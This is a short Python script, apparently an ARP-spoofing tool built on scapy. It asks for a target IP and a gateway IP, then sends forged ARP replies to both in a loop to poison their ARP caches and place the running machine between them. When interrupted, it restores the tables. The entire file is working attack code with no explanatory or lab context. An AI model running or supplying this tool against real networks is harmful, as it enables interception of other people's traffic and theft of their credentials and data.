import scapy.all as scapy
import sys
import time


def getmac(ip):
    arprequest=scapy.ARP(pdst=ip)
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arprequest_broadcast=broadcast/arprequest
    answered_list=scapy.srp(arprequest_broadcast,timeout=1)[0]
    return answered_list[0][1].hwsrc

def spoof(targetip,spoofip):
    targetmac=getmac(targetip)
    packet=scapy.ARP(op=2,pdst=targetip,hwdst=targetmac,psrc=spoofip)
    scapy.send(packet)

def restore(destinationip,sourceip):
    destinationmac=getmac(destinationip)
    sourcemac=getmac(sourceip)
    packet=scapy.ARP(op=2,pdst=destinationip,hwdst=destinationmac,psrc=sourceip,hwsrc=sourcemac)
    scapy.send(packet,count=4,verbose=False)





targetip=input("Enter target IP adddress: ")
gatewayip=input("Enter gateway IP: ")
try:
    packet_sent_count=0
    while True:
        spoof(targetip,gatewayip)
        spoof(gatewayip,targetip)
        packet_sent_count+=2
        print("\r[+] Sent "+str(packet_sent_count))
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL+C.... Resetting tables... Please Wait...\n")
    restore(targetip,gatewayip)
    restore(gatewayip,targetip)

